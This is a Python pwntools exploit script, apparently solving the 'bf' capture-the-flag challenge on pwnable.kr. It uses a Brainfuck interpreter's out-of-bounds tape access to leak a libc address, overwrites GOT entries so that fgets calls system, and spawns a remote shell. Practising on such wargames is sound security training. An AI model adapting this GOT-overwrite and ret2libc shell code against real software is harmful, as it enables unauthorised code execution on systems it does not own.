from pwn import *

main = 0x08048671
puts_got = 0x0804A018
memset_got = 0x0804A02C  #changing as fgets's address
fgets_got = 0x0804A010   #changing as system's address
putchar_got = 0x0804A030  #leak 
buf = 0x0804A0A0

debug = 0
if debug:
	p = process('./bf')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	p = remote('pwnable.kr', 9001)
	libc = ELF('bf_libc.so')

print (buf - putchar_got)
payload = 112 * '<'   #putchar
payload += '..>.>.>.' #putchar_got + 3
payload += '<<<' + ',>,>,>,' #putchar_got + 3
payload += '<<<<<<<' #memset_got
payload += ',>,>,>,' #memset_got + 3
payload += '<<<' + '<' * (memset_got - fgets_got)
payload += ',>,>,>,'  #fgets_got+ 3
payload += '.'

print payload

print "[*]sending payload...."
#gdb.attach(p)
p.recvuntil("type some brainfuck instructions except [ ]\n")
p.sendline(payload)

'''calculating some address'''
p.recv(1)
r = p.recv(4)
print len(r)
#assert len(r) == 4
putchar_addr = u32(r)
putchar_addr = putchar_addr
print "putchar_addr: " + hex(putchar_addr)
libc_addr = putchar_addr - libc.symbols['putchar']
print "libc_addr: " + hex(libc_addr)
gets_addr = libc_addr + libc.symbols['gets']
print "gets_addr: " + hex(gets_addr)
system_addr = libc_addr + libc.symbols['system']
print "system_addr: " +  hex(system_addr)

p.send(p32(main))#overwrite putchar_got
p.send(p32(gets_addr))#overwrite memset_got
p.send(p32(system_addr))#overwrite fgets_got

#gdb.attach(p)
p.recvuntil("type some brainfuck instructions except [ ]\n")
p.sendline('/bin/sh\x00')

p.interactive()


